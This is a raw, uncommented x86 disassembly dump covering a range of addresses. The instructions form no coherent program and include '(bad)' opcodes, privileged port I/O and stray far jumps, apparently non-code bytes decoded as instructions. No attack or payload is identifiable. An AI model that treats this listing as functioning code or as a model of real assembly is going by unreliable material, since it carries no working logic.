  49909d:	test   DWORD PTR [edi+0x7f],edi
  4990a0:	xor    dl,BYTE PTR [edi]
  4990a2:	mov    ebx,0x36330b90
  4990a7:	pop    edi
  4990a8:	xor    al,0xb8
  4990aa:	nop
  4990ab:	ss push 0x3934fe1f
  4990b1:	lods   eax,DWORD PTR ds:[esi]
  4990b2:	mov    al,0x31
  4990b4:	loop   0x4990d5
  4990b6:	aas    
  4990b7:	inc    esp
  4990b8:	mov    ch,0x90
  4990ba:	mov    edi,edi
  4990bc:	xor    edi,ebx
  4990be:	in     eax,dx
  4990bf:	rcr    DWORD PTR [eax-0x38],1
  4990c2:	aaa    
  4990c3:	jmp    0x499144
  4990c5:	mov    ds:0x1f563aba,al
  4990ca:	inc    esp
  4990cb:	fisttp WORD PTR [esi+0x41]
  4990ce:	mov    eax,0xf731fed0
  4990d3:	pusha  
  4990d4:	in     eax,dx
  4990d5:	add    al,0x24
  4990d7:	and    bl,BYTE PTR [edi]
  4990d9:	ins    DWORD PTR es:[edi],dx
  4990da:	test   eax,0x1b3f7589
  4990df:	jmp    DWORD PTR [edx+esi*1+0x46d7b855]
  4990e6:	mov    edi,0xc0223538
  4990eb:	cmp    ah,BYTE PTR [esi]
  4990ed:	inc    edx
  4990ee:	pop    ds
  4990ef:	jmp    FWORD PTR [esi]
  4990f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4990f2:	mov    ebp,DWORD PTR [edx+0x44]
  4990f5:	fild   WORD PTR [edi+ebx*2+0x44]
  4990f9:	jb     0x49911c
  4990fb:	fld    QWORD PTR [edx+0x1f]
  4990fe:	xor    al,0x38
  499100:	push   ss
  499101:	pusha  
  499102:	and    DWORD PTR [edi],edx
  499104:	inc    ebx
  499105:	imul   ebx,DWORD PTR [esp+ebp*2+0x4d],0xffffff96
  49910a:	outs   dx,DWORD PTR ds:[esi]
  49910b:	lahf   
  49910c:	inc    edx
  49910d:	test   DWORD PTR [eax+ecx*8-0x7b],ebx
  499111:	inc    edx
  499112:	inc    edx
  499113:	rol    DWORD PTR [esp+esi*4-0x28],cl
  499117:	inc    ebx
  499118:	pop    edi
  499119:	pop    edi
  49911a:	ss jg  0x49915f
  49911d:	mov    al,ds:0x5f304703
  499122:	xlat   BYTE PTR ds:[ebx]
  499123:	add    eax,0x5f12d631
  499128:	inc    esp
  499129:	pop    ds
  49912a:	jb     0x49919d
  49912c:	and    DWORD PTR [edi],edx
  49912e:	inc    esp
  49912f:	ss jle 0x499168
  499132:	lds    edi,FWORD PTR [esi]
  499134:	inc    ebx
  499135:	pop    edx
  499136:	aaa    
  499137:	inc    esi
  499138:	jg     0x49913e
  49913a:	sbb    ebp,DWORD PTR [ecx]
  49913c:	scas   al,BYTE PTR es:[edi]
  49913d:	aas    
  49913e:	or     edx,DWORD PTR [edi]
  499140:	int3   
  499141:	pop    eax
  499142:	fwait
  499143:	pop    ds
  499144:	inc    esp
  499145:	nop
  499146:	fist   DWORD PTR [edx+0x1f441f89]
  49914c:	xor    al,0xb0
  49914e:	nop
  49914f:	or     edi,DWORD PTR [ecx+0x66424338]
  499155:	imul   esp,DWORD PTR [esi+0x4357f6f],0x2c
  49915c:	cdq    
  49915d:	fcomp  DWORD PTR [edi]
  49915f:	inc    ebx
  499160:	arpl   cx,dx
  499162:	push   esi
  499163:	jno    0x499108
  499165:	pop    ds
  499166:	jg     0x4991a4
  499168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  499169:	test   BYTE PTR [esi+edi*4+0x46],bh
  49916d:	cli    
  49916e:	les    edx,FWORD PTR [esi]
  499170:	xchg   edi,eax
  499171:	imul   esi,DWORD PTR [edi-0x1],0xc85c85b5
  499178:	xor    esi,DWORD PTR [edx]
  49917a:	pop    edi
  49917b:	cmp    DWORD PTR [edx],ebx
  49917d:	scas   al,BYTE PTR es:[edi]
  49917e:	stos   BYTE PTR es:[edi],al
  49917f:	push   DWORD PTR [esi]
  499181:	jg     0x4991b7
  499183:	lea    eax,[esi]
  499185:	pop    eax
  499186:	or     edi,DWORD PTR [edi-0x766f494c]
  49918c:	push   DWORD PTR [eax]
  49918e:	pop    ds
  49918f:	and    edi,edx
  499191:	test   ebp,edx
  499193:	jg     0x499214
  499195:	inc    esp
  499196:	dec    ebp
  499197:	and    al,0x13
  499199:	xor    al,BYTE PTR [esp+eax*2+0x43]
  49919d:	and    DWORD PTR [edi],edx
  49919f:	jb     0x4991d2
  4991a1:	lahf   
  4991a2:	inc    ebx
  4991a3:	inc    ebx
  4991a4:	test   DWORD PTR [eax+ecx*8-0x4c],ebx
  4991a8:	pop    ds
  4991a9:	xor    al,0x38
  4991ab:	mov    gs,WORD PTR [edi]
  4991ad:	(bad)  
  4991ae:	leave  
  4991af:	inc    ebx
  4991b0:	(bad)  
  4991b1:	jg     0x4991d4
  4991b3:	add    esp,DWORD PTR [edi]
  4991b5:	xchg   BYTE PTR [eax],dh
  4991b7:	lahf   
  4991b8:	mov    DWORD PTR ss:[edx],eax
  4991bb:	adc    esi,DWORD PTR [edx]
  4991bd:	inc    ecx
  4991be:	inc    ebp
  4991bf:	pop    edi
  4991c0:	cdq    
  4991c1:	fsubr  DWORD PTR [eax+0x381fbf02]
  4991c7:	pusha  
  4991c8:	jno    0x4991e6
  4991ca:	sub    al,0x7f
  4991cc:	pop    ds
  4991cd:	in     al,0x42
  4991cf:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4991d1:	inc    BYTE PTR [ecx+0x41]
  4991d4:	inc    edx
  4991d5:	mov    ecx,0x1f2d8990
  4991da:	cmp    BYTE PTR [ebx+0x32],al
  4991dd:	popf   
  4991de:	js     0x4991eb
  4991e0:	or     ebx,DWORD PTR [edi-0x4cde8dce]
  4991e6:	adc    al,0xff
  4991e8:	cmp    DWORD PTR [ecx+0x2a],eax
  4991eb:	add    ah,0x16
  4991ee:	pop    ds
  4991ef:	jg     0x499255
  4991f1:	jmp    0xd741:0x7f3f5ac2
  4991f8:	push   ebx
  4991f9:	inc    edx
  4991fa:	es inc ebp
  4991fc:	lahf   
  4991fd:	push   DWORD PTR [ecx+0x425d8b90]
  499203:	aas    
  499204:	inc    ecx
  499205:	dec    edx
  499206:	pushf  
  499207:	mov    eax,0xdf329f18
  49920c:	xor    BYTE PTR fs:0x34ffef81,0x2e
  499214:	in     al,0x42
  499216:	cs xor eax,0x2ec53535
  49921c:	in     al,0x42
  49921e:	xor    eax,0x453aff36
  499223:	pop    esp
  499224:	enter  0x4444,0xd7
  499228:	fadd   DWORD PTR [edx+0x26]
  49922b:	push   ss
  49922c:	push   DWORD PTR [ebx]
  49922e:	pop    ds
  49922f:	es in  al,0xa
  499232:	xchg   esp,eax
  499233:	inc    DWORD PTR [ebx+0x43]
  499236:	pop    eax
  499237:	es fs inc edx
  49923a:	inc    ebx
  49923b:	inc    ebx
  49923c:	mov    ecx,0x1fe83690
  499241:	jle    0x499274
  499243:	xor    DWORD PTR [esp+ecx*2+0x6b],ebx
  499247:	or     ebx,DWORD PTR [edi]
  499249:	aas    
  49924a:	inc    ebx
  49924b:	cwde   
  49924c:	pop    esp
  49924d:	enter  0x4385,0x43
  499251:	in     al,0xa2
  499253:	sbb    ah,dl
  499255:	pop    ds
  499256:	inc    edx
  499257:	inc    DWORD PTR [edx-0x70]
  49925a:	out    dx,eax
  49925b:	inc    edx
  49925c:	cs inc edx
  49925e:	inc    edx
  49925f:	inc    DWORD PTR [esi+0x64]
  499262:	bound  ecx,QWORD PTR [ebx]
  499264:	mov    ecx,0x21381f30
  499269:	mov    bh,0x15
  49926b:	sub    al,0x7
  49926d:	inc    DWORD PTR [ebp+ebp*2+0x21]
  499271:	pop    ss
  499272:	jb     0x4992b8
  499274:	inc    esp
  499275:	pop    ds
  499276:	or     edi,DWORD PTR [ecx+0x457f6f90]
  49927c:	inc    ebp
  49927d:	lods   eax,DWORD PTR ds:[esi]
  49927e:	les    esi,FWORD PTR [ebp-0x46c0ba70]
  499284:	nop
  499285:	mov    DWORD PTR ds:0x4242ffae,ebx
  49928b:	xchg   BYTE PTR [esi+0x7f420b90],dh
  499291:	inc    ebx
  499292:	outs   dx,BYTE PTR ds:[esi]
  499293:	sub    al,0xe4
  499295:	inc    edx
  499296:	inc    ebx
  499297:	mov    edi,0x23017563
  49929c:	aas    
  49929d:	mov    cl,0xe3
  49929f:	aam    0xa
  4992a1:	cmp    ebx,DWORD PTR [edi+0x38]
  4992a4:	dec    eax
  4992a6:	les    edx,FWORD PTR [esi]
  4992a8:	jb     0x4992eb
  4992aa:	pop    ds
  4992ab:	cmp    BYTE PTR [ecx+0x62],dh
  4992ae:	adc    DWORD PTR [ebp+esi*1+0x1f],ebx
  4992b2:	lahf   
  4992b3:	shl    eax,1
  4992b5:	lods   eax,DWORD PTR ds:[esi]
  4992b6:	push   0xffffffff
  4992b8:	pop    ds
  4992b9:	ss jg  0x49924c
  4992bc:	or     edi,DWORD PTR [ecx+0x38ff37d8]
  4992c2:	cmp    DWORD PTR [ecx+0x3fb6242e],edi
  4992c8:	jg     0x49930c
  4992ca:	pop    edx
  4992cb:	pop    es
  4992cc:	push   es
  4992cd:	or     DWORD PTR [edx],esi
  4992cf:	lahf   
  4992d0:	enter  0x16c5,0xc9
  4992d4:	outs   dx,DWORD PTR ds:[esi]
  4992d5:	inc    DWORD PTR [ecx+0x5b]
  4992d8:	enter  0x5c85,0x42
  4992dc:	ss pop ds
  4992de:	and    al,0x28
  4992e0:	and    DWORD PTR [ebx],edx
  4992e2:	inc    ebx
  4992e3:	mov    eax,ds:0x7e524208
  4992e8:	aaa    
  4992e9:	jg     0x49927d
  4992eb:	rcl    BYTE PTR [edx],cl
  4992ed:	add    eax,0x28a51fff
  4992f2:	lods   eax,DWORD PTR ds:[esi]
  4992f3:	lods   eax,DWORD PTR ds:[esi]
  4992f4:	daa    
  4992f5:	pop    ds
  4992f6:	pop    ss
  4992f7:	pop    esp
  4992f8:	enter  0x56c5,0xff
  4992fc:	xor    DWORD PTR [ecx],esi
  4992fe:	test   DWORD PTR [eax+ecx*8-0x7b],ebx
  499302:	xor    dh,BYTE PTR [edi]
  499304:	sub    eax,0x37c51060
  499309:	jg     0x499304
  49930b:	es stos BYTE PTR es:[edi],al
  49930d:	ror    DWORD PTR [edi],0xff
  499310:	inc    ecx
  499311:	inc    DWORD PTR [esi+0xb]
  499314:	mov    ecx,0x30300b90
  499319:	and    DWORD PTR [edi],edx
  49931b:	mov    ebx,0x7f303090
  499320:	xor    DWORD PTR [ecx],esp
  499322:	(bad)  
  499323:	and    al,0x6a
  499325:	addr16 jg 0x49933b
  499328:	xor    ah,BYTE PTR [ecx]
  49932a:	pop    es
  49932b:	inc    ecx
  49932c:	inc    ecx
  49932d:	inc    ecx
  49932e:	and    eax,DWORD PTR [ecx+0x5b]
  499331:	push   esp
  499332:	(bad)  
  499333:	jg     0x4993a1
  499335:	and    DWORD PTR [ebp+0x70],ebp
  499338:	mov    edi,0xb91f437e
  49933d:	imul   eax,DWORD PTR ds:0x337f7f48,0xbb118d3
  499347:	xor    edi,DWORD PTR [edi-0x1e]
  49934a:	cwde   
  49934b:	fadd   DWORD PTR [edx]
  49934d:	out    dx,eax
  49934e:	inc    DWORD PTR [edi+ebx*1+0x54]
  499352:	sub    eax,0x39ff3664
  499357:	jmp    FWORD PTR [ebp+0x41c9606a]
  49935d:	(bad)  
  49935e:	mov    ebx,0xff990b90
  499363:	inc    ecx
  499364:	xor    al,BYTE PTR [edx+0x1f]
  499367:	inc    edx
  499368:	pop    edx
  499369:	jmp    0xb93:0x38fe1f58
  499370:	cdq    
  499371:	fcomp  DWORD PTR [edi]
  499373:	xor    al,0x38
  499375:	nop
  499376:	or     ebx,DWORD PTR [ecx+0x39397f62]
  49937c:	test   esp,ecx
  49937e:	shl    BYTE PTR [ebp+0xa357f3f],cl
  499384:	adc    bl,BYTE PTR [ebx-0x38]
  499387:	ss pop ds
  499389:	jmp    FWORD PTR [ebp+0x21]
  49938c:	pop    ss
  49938d:	fwait
  49938e:	ss jg  0x4993c8
  499391:	pop    ds
  499392:	or     dl,BYTE PTR [ecx+0x5f45303a]
  499398:	jg     0x4993b9
  49939a:	fs and al,0xe4
  49939d:	inc    ecx
  49939e:	or     eax,DWORD PTR [ecx+eax*4-0x6a]
  4993a2:	fsub   DWORD PTR [edx-0x1]
  4993a5:	pop    edi
  4993a6:	jg     0x499332
  4993a8:	sbb    edx,DWORD PTR [edi]
  4993aa:	jnp    0x4993ab
  4993ac:	pop    ds
  4993ad:	cmp    BYTE PTR [edi+0x5990b90b],bh
  4993b3:	jg     0x4993e7
  4993b5:	xor    edx,DWORD PTR [eax+0x1f62442b]
  4993bb:	jg     0x4993fe
  4993bd:	sbb    eax,0x41990991
  4993c2:	inc    ecx
  4993c3:	pop    ds
  4993c4:	sub    ebx,DWORD PTR [ecx]
  4993c6:	test   al,0x2
  4993c8:	inc    DWORD PTR [ecx+0x72]
  4993cb:	and    DWORD PTR [ebx-0xb4c64b],esi
  4993d1:	xor    BYTE PTR [ecx],dh
  4993d3:	pop    edx
  4993d4:	enter  0x16c4,0x1f
  4993d8:	cmp    BYTE PTR [ebx],dl
  4993da:	adc    eax,0x394f08ae
  4993df:	(bad)  
  4993e0:	cmp    eax,ecx
  4993e2:	test   DWORD PTR [esp+edx*2-0x1],ebx
  4993e6:	cmp    DWORD PTR [ecx],edi
  4993e8:	and    DWORD PTR [edi],edx
  4993ea:	xor    bl,BYTE PTR [ebx+0x7f]
  4993ed:	inc    esi
  4993ee:	inc    esi
  4993ef:	xchg   esi,eax
  4993f0:	mov    eax,0x3f467216
  4993f5:	jle    0x4993e3
  4993f7:	and    bh,BYTE PTR [eax-0xbcbc70]
  4993fd:	call   FWORD PTR ss:[eax+ecx*8-0x7b]
  499402:	pop    esp
  499403:	inc    ebx
  499404:	inc    esp
  499405:	inc    esp
  499406:	loop   0x499462
  499408:	enter  0x4485,0x3f
  49940c:	lds    ebp,FWORD PTR [esi]
  49940e:	fs xchg esi,eax
  499410:	jg     0x499453
  499412:	inc    ecx
  499413:	push   DWORD PTR [ecx+0x41c85c85]
  499419:	inc    edx
  49941a:	pop    ds
  49941b:	pusha  
  49941c:	and    DWORD PTR [edi],edx
  49941e:	xor    bh,BYTE PTR [eax]
  499420:	inc    ebx
  499421:	nop
  499422:	or     edi,DWORD PTR [ecx+0x38ff07ad]
  499428:	cmp    BYTE PTR [esi+0x38b90b90],dh
  49942e:	cmp    DWORD PTR [edi],ebx
  499430:	mov    cl,0xe4
  499432:	inc    edx
  499433:	cmp    BYTE PTR es:[ebx+0x6a],al
  499437:	lods   al,BYTE PTR ds:[esi]
  499438:	adc    ecx,DWORD PTR [ebx+0x42ff9f1f]
  49943e:	cs fs mov dh,0xff
  499442:	ss ss nop
  499445:	mov    DWORD PTR ds:0x381f37e4,ebp
  49944b:	adc    al,0xa
  49944d:	or     DWORD PTR [ecx+0x5c38fe43],edi
  499453:	enter  0x842c,0xff
  499457:	xor    al,0x34
  499459:	adc    ebx,DWORD PTR [ebx-0x38]
  49945c:	test   DWORD PTR ds:0x1601381f,esi
  499462:	jb     0x499485
  499464:	inc    ebx
  499465:	inc    ch
  499467:	xor    al,dl
  499469:	test   DWORD PTR [edi+0x36],edi
  49946c:	pop    edi
  49946d:	(bad)  [edx]
  49946f:	mov    ch,0xd8
  499471:	inc    ecx
  499472:	pop    ds
  499473:	(bad)  
  499474:	call   DWORD PTR [eax+0x3390b90b]
  49947a:	xor    esi,DWORD PTR [ebx]
  49947c:	xchg   BYTE PTR [edi],dh
  49947e:	loop   0x499438
  499480:	xor    al,0x1f
  499482:	call   FWORD PTR [edi-0x67]
  499485:	imul   BYTE PTR [ebp+0x2c]
  499488:	mov    ebx,DWORD PTR [edi]
  49948a:	cmp    DWORD PTR [esp+eax*1+0x53],ebx
  49948e:	sub    al,0x7f
  499490:	cmp    BYTE PTR [edi+0x38],bh
  499493:	or     edi,DWORD PTR [ecx+0x7f3885d8]
  499499:	xor    edi,DWORD PTR [ecx+0x5f038ea8]
  49949f:	cmp    bh,bh
  4994a1:	cmp    BYTE PTR [ecx-0x4a],ah
  4994a4:	nop
  4994a5:	or     edi,DWORD PTR [eax]
  4994a7:	jg     0x4994df
  4994a9:	or     edi,DWORD PTR [ecx+0x367f8b90]
  4994af:	rcr    BYTE PTR ss:[ebx+0x3a9f1c48],0x66
  4994b7:	add    ecx,DWORD PTR [edx]
  4994b9:	sbb    DWORD PTR [edi],ecx
  4994bb:	push   DWORD PTR ds:0x42e08b90
  4994c1:	cmp    DWORD PTR [edi],edi
  4994c3:	inc    esp
  4994c4:	or     ebx,DWORD PTR [ecx+0x7f31b92d]
  4994ca:	inc    esi
  4994cb:	inc    esi
  4994cc:	sbb    al,0x8
  4994ce:	add    eax,0xbb175f7f
  4994d3:	nop
  4994d4:	or     DWORD PTR [edi+0x31],edi
  4994d7:	xor    edi,edi
  4994d9:	inc    ebx
  4994da:	and    DWORD PTR [edi],edx
  4994dc:	jb     0x4994ff
  4994de:	inc    esp
  4994df:	inc    esp
  4994e0:	mov    BYTE PTR [ebx],dl
  4994e2:	pop    ss
  4994e3:	jb     0x499529
  4994e5:	xor    ebx,DWORD PTR [edi+0x5990bb17]
  4994eb:	jg     0x49952e
  4994ed:	inc    ecx
  4994ee:	inc    DWORD PTR [ecx+0x21]
  4994f1:	pop    ss
  4994f2:	jb     0x499515
  4994f4:	inc    edx
  4994f5:	inc    edx
  4994f6:	pop    eax
  4994f7:	enter  0x7145,0x42
  4994fb:	jg     0x49952e
  4994fd:	pop    esp
  4994fe:	enter  0x1c6c,0x5f
  499502:	(bad)  
  499503:	cmp    BYTE PTR [eax],bh
  499505:	test   DWORD PTR [eax+ecx*8-0x7b],ebx
  499509:	cmp    BYTE PTR [ecx],bh
  49950b:	adc    BYTE PTR [edi],dl
  49950d:	xor    dh,BYTE PTR [ecx+0x6844391f]
  499513:	xor    ah,BYTE PTR [ebp-0x10c98077]
  499519:	pop    edx
  49951a:	in     al,dx
  49951b:	pusha  
  49951c:	inc    esp
  49951d:	mov    edi,0x628b1f45
  499522:	in     eax,dx
  499523:	dec    eax
  499524:	das    
  499525:	jg     0x499546
  499527:	mov    ebp,DWORD PTR [ebp-0xb8e6e3]
  49952d:	pop    ds
  49952e:	xchg   esi,eax
  49952f:	dec    eax
  499530:	scas   al,BYTE PTR es:[edi]
  499531:	sbb    edi,DWORD PTR [edi+0x42d8ff38]
  499537:	cs cmp DWORD PTR fs:[ecx+0x1f],eax
  49953c:	xchg   edi,eax
  49953d:	nop
  49953e:	or     ebx,DWORD PTR [ecx+0x57e4541]
  499544:	cmp    dh,BYTE PTR [ecx+0xe9f4290]
  49954a:	dec    esi
  49954b:	sub    al,0xe4
  49954d:	jle    0x499586
  49954f:	lahf   
  499550:	ss inc edx
  499552:	es fs inc edx
  499555:	inc    ecx
  499556:	inc    ebp
  499557:	fs inc edx
  499559:	es xor dh,BYTE PTR fs:[esi]
  49955d:	inc    ecx
  49955e:	pop    esp
  49955f:	push   esp
  499560:	dec    ebx
  499561:	es inc ebp
  499563:	inc    DWORD PTR [ecx+0x32]
  499566:	pop    ebx
  499567:	enter  0x4185,0x7f
  49956b:	ss push ss
  49956d:	jb     0x499590
  49956f:	pop    ss
  499570:	aaa    
  499571:	aaa    
  499572:	pop    ss
  499573:	repnz add al,BYTE PTR [edi+0x34337edf]
  49957a:	daa    
  49957b:	push   ss
  49957c:	jb     0x49959f
  49957e:	xor    al,0x9f
  499580:	adc    esi,DWORD PTR [edx]
  499582:	and    DWORD PTR [edi],eax
  499584:	inc    ebp
  499585:	xor    dh,BYTE PTR [esi]
  499587:	leave  
  499588:	inc    esp
  499589:	xor    ah,BYTE PTR [ecx]
  49958b:	inc    ecx
  49958c:	xor    cl,BYTE PTR [ebx]
  49958e:	mov    ecx,0x32ff6f90
  499593:	xor    ah,BYTE PTR [ecx]
  499595:	pop    ss
  499596:	jb     0x499549
  499598:	xor    bh,BYTE PTR [edi+0x33]
  49959b:	xor    esi,DWORD PTR [ebp+0x3371d06d]
  4995a1:	pop    ds
  4995a2:	fwait
  4995a3:	dec    DWORD PTR [ecx+0x30c85c85]
  4995a9:	xor    BYTE PTR [esp+ecx*2+0x329fc1c8],al
  4995b0:	ss leave 
  4995b2:	test   BYTE PTR [eax+ecx*8+0x41],cl
  4995b6:	inc    ebp
  4995b7:	xor    cl,BYTE PTR [ebx]
  4995b9:	mov    ecx,0x361f2e90
  4995be:	inc    ecx
  4995bf:	mov    ecx,0x45909790
  4995c4:	jle    0x49960c
  4995c6:	inc    esi
  4995c7:	les    esi,FWORD PTR [ebp+0x3f460b90]
  4995cd:	pop    esp
  4995ce:	enter  0xb485,0x7e
  4995d2:	inc    ebx
  4995d3:	inc    ebx
  4995d4:	inc    ebx
  4995d5:	enter  0x89c1,0x85
  4995d9:	lahf   
  4995da:	xor    cl,BYTE PTR [eax+ecx*8-0x7c]
  4995de:	dec    esp
  4995df:	ss inc ecx
  4995e1:	inc    ebp
  4995e2:	and    DWORD PTR [ebx],edx
  4995e4:	xor    dl,BYTE PTR [ecx+0x21324136]
  4995ea:	adc    esi,DWORD PTR [edx]
  4995ec:	inc    ebp
  4995ed:	xor    dh,BYTE PTR [esi]
  4995ef:	inc    esp
  4995f0:	xor    ah,BYTE PTR [ecx]
  4995f2:	adc    eax,DWORD PTR [ecx+0x45]
  4995f5:	pop    esp
  4995f6:	enter  0xb485,0xfe
  4995fa:	cmp    BYTE PTR [eax],bh
  4995fc:	cmp    BYTE PTR [ebx],dl
  4995fe:	pop    ebx
  4995ff:	enter  0x3985,0x1f
  499603:	inc    ecx
  499604:	xor    dl,BYTE PTR [esi]
  499606:	jb     0x499629
  499608:	inc    ebp
  499609:	or     ebx,DWORD PTR [ecx+0x7f8fd0ad]
  49960f:	ss cdq 
  499611:	nop
  499612:	adc    DWORD PTR [ebx],0xffffff9f
  499615:	inc    ebp
  499616:	xor    cl,BYTE PTR [ecx]
  499618:	cdq    
  499619:	nop
  49961a:	or     DWORD PTR [esi],esi
  49961c:	inc    ecx
  49961d:	nop
  49961e:	or     DWORD PTR [ecx+0x36324590],ebx
  499624:	cdq    
  499625:	nop
  499626:	or     DWORD PTR [ecx+0x9324541],ebx
  49962c:	cdq    
  49962d:	nop
  49962e:	or     DWORD PTR [esi],esi
  499630:	inc    ecx
  499631:	pop    ecx
  499632:	or     bl,BYTE PTR [ecx-0xcdba70]
  499638:	nop
  499639:	or     edi,DWORD PTR [ecx+0x33323290]
  49963f:	or     DWORD PTR [ecx],edi
  499641:	cmp    BYTE PTR [ecx+0xa59419f],dh
  499647:	cdq    
  499648:	nop
  499649:	inc    ebp
  49964a:	xor    bh,bh
  49964c:	nop
  49964d:	or     edi,DWORD PTR [ecx+0x31303090]
  499653:	jb     0x499606
  499655:	or     edi,DWORD PTR [ecx+0x317f3131]
  49965b:	ins    DWORD PTR es:[edi],dx
  49965c:	imul   esp,DWORD PTR [ecx],0x17
  49965f:	xor    cl,BYTE PTR [ebx]
  499661:	cdq    
  499662:	test   al,0xd6
  499664:	lahf   
  499665:	(bad)  
  499666:	cmp    BYTE PTR [esi+0xb],ah
  499669:	mov    ecx,0x7f383890
  49966e:	inc    esi
  49966f:	test   DWORD PTR [esp+ebp*8+0x42],ebx
  499673:	inc    esi
  499674:	push   DWORD PTR [eax]
  499676:	xor    dl,BYTE PTR [eax+0x25]
  499679:	mov    dl,BYTE PTR [edi]
  49967b:	(bad)  
  49967c:	cmp    BYTE PTR [edi],dl
  49967e:	jb     0x4996a1
  499680:	pop    ss
  499681:	cmp    BYTE PTR [eax],bh
  499683:	cmp    BYTE PTR [eax+ecx*8+0x6c],bl
  499687:	and    DWORD PTR [edi+0x44],edi
  49968a:	inc    ebp
  49968b:	lea    ebx,[eax-0x49607a77]
  499691:	nop
  499692:	or     ebx,DWORD PTR [ecx+0x1f42417f]
  499698:	or     DWORD PTR [ecx+0x38ff2442],edi
  49969e:	adc    ebp,DWORD PTR [ecx]
  4996a0:	cdq    
  4996a1:	nop
  4996a2:	cmp    BYTE PTR [eax],bh
  4996a4:	test   DWORD PTR [esp+edx*2],ecx
  4996a7:	mov    ebx,DWORD PTR [edi-0x7a4cc701]
  4996ad:	pop    esp
  4996ae:	enter  0x3838,0x7f
  4996b2:	cmp    DWORD PTR [ecx],esp
  4996b4:	pop    ss
  4996b5:	jb     0x4996d8
  4996b7:	inc    ecx
  4996b8:	inc    ecx
  4996b9:	or     ebx,DWORD PTR [ecx-0xc0945b]
  4996bf:	ss nop
  4996c1:	or     edi,DWORD PTR [ecx+0x37373790]
  4996c7:	jb     0x4996ea
  4996c9:	pop    ss
  4996ca:	mov    ebx,0x38387f37
  4996cf:	inc    eax
  4996d0:	xchg   ebp,eax
  4996d1:	mov    eax,0xc8ff3f16
  4996d6:	test   DWORD PTR [eax+ecx*8+0x38],ebx
  4996da:	cmp    BYTE PTR [eax],bh
  4996dc:	and    DWORD PTR [ebx+0x7f385c85],esi
  4996e2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4996e4:	mov    eax,0x3f367216
  4996e9:	bound  ecx,QWORD PTR fs:[ebx]
  4996ec:	cdq    
  4996ed:	jg     0x499722
  4996ef:	pop    ds
  4996f0:	inc    ecx
  4996f1:	or     DWORD PTR [ecx+0x38ff2c42],edi
  4996f7:	rcl    BYTE PTR [ecx],1
  4996f9:	cdq    
  4996fa:	nop
  4996fb:	cmp    BYTE PTR [eax],bh
  4996fd:	pop    ds
  4996fe:	mov    ecx,0xff2a8190
  499703:	cmp    BYTE PTR [eax],bh
  499705:	fs mov dh,0x90
  499708:	or     edi,DWORD PTR [eax]
  49970a:	jg     0x49973e
  49970c:	sub    eax,0x322e42e4
  499711:	xor    dl,BYTE PTR [ebx]
  499713:	aad    0x1a
  499715:	ins    DWORD PTR es:[edi],dx
  499716:	outs   dx,DWORD PTR ds:[esi]
  499717:	push   DWORD PTR [edi]
  499719:	and    DWORD PTR [edi],edx
  49971b:	jb     0x49973e
  49971d:	aaa    
  49971e:	aaa    
  49971f:	mov    dh,0x25
  499721:	pop    ss
  499722:	jb     0x49975c
  499724:	cmp    BYTE PTR [edi+0x8],bl
  499727:	js     0x4996d4
  499729:	add    BYTE PTR [edi+0x1f],bl
  49972c:	push   es
  49972d:	stos   BYTE PTR es:[edi],al
  49972e:	inc    ebp
  49972f:	sub    BYTE PTR [edi],ch
  499731:	push   DWORD PTR [edi]
  499733:	inc    edx
  499734:	cs in  al,0x42
  499737:	aaa    
  499738:	aaa    
  499739:	or     ebx,DWORD PTR [ecx+0x7f37e42d]
  49973f:	inc    ebp
  499740:	sub    al,0xc5
  499742:	mov    ch,0x90
  499744:	inc    ebp
  499745:	aas    
  499746:	dec    eax
  499748:	test   DWORD PTR [eax+ecx*8+0x42],ebx
  49974c:	inc    edx
  49974d:	inc    edx
  49974e:	xor    dh,BYTE PTR [ecx+0x1f435c85]
  499754:	inc    ecx
  499755:	pusha  
  499756:	push   0x5b451721
  49975b:	xor    esi,DWORD PTR [eax+ebp*4-0x1be00051]
  499762:	inc    edx
  499763:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  499765:	aaa    
  499766:	inc    edx
  499767:	inc    esi
  499768:	inc    edx
  499769:	cs in  al,0x25
  49976c:	jle    0x4997a4
  49976e:	xor    DWORD PTR ss:[eax],edx
  499771:	mov    esp,eax
  499773:	ss jg  0x4997b5
  499776:	pop    ss
  499777:	jb     0x49979a
  499779:	mov    bl,0x7f
  49977b:	xor    esi,DWORD PTR [ebx]
  49977d:	xor    ecx,eax
  49977f:	test   DWORD PTR [esp+eax*1-0x1],ebx
  499783:	cmp    BYTE PTR [eax],bh
  499785:	cmp    al,bl
  499787:	test   DWORD PTR [eax+edi*1+0x38],ebx
  49978b:	lahf   
  49978c:	xor    al,0x21
  49978e:	add    edx,ebp
  499790:	loop   0x4997b1
  499792:	push   DWORD PTR [edi]
  499794:	jb     0x4997b7
  499796:	pop    ss
  499797:	jb     0x4997d0
  499799:	aaa    
  49979a:	aaa    
  49979b:	xchg   BYTE PTR [ebp+0x367f16cc],al
  4997a1:	pop    ds
  4997a2:	xor    eax,0x1e2518e8
  4997a7:	pop    ds
  4997a8:	test   DWORD PTR [eax+ecx*8+0x40],ebx
  4997ac:	push   DWORD PTR [edi]
  4997ae:	aaa    
  4997af:	inc    edx
  4997b0:	cs xchg BYTE PTR fs:[edi+0x30],bh
  4997b5:	xor    BYTE PTR [eax+edi*1+0x3530e42e],cl
  4997bc:	pop    ds
  4997bd:	pop    ss
  4997be:	jb     0x4997e1
  4997c0:	adc    edi,edi
  4997c2:	xor    DWORD PTR [ecx],esi
  4997c4:	xor    ah,BYTE PTR [edx+0x17]
  4997c7:	jb     0x4997ea
  4997c9:	xor    dh,BYTE PTR [edx]
  4997cb:	jg     0x4997af
  4997cd:	inc    edx
  4997ce:	cs in  al,0x32
  4997d1:	xor    esi,DWORD PTR [ebx]
  4997d3:	pop    ss
  4997d4:	xor    dl,BYTE PTR [ecx-0x53]
  4997d7:	pop    ss
  4997d8:	push   DWORD PTR [esi]
  4997da:	aaa    
  4997db:	bound  edx,QWORD PTR [edi+0x72]
  4997de:	and    DWORD PTR [edi],esi
  4997e0:	inc    ecx
  4997e1:	pop    ds
  4997e2:	sub    eax,0x7eda42e4
  4997e7:	xor    BYTE PTR [ecx],dh
  4997e9:	xor    dl,BYTE PTR [eax+0xd]
  4997ec:	bound  ebx,QWORD PTR [edi]
  4997ee:	push   DWORD PTR [esi]
  4997f0:	pop    ss
  4997f1:	jb     0x499814
  4997f3:	pop    ss
  4997f4:	ss ss ss pop esp
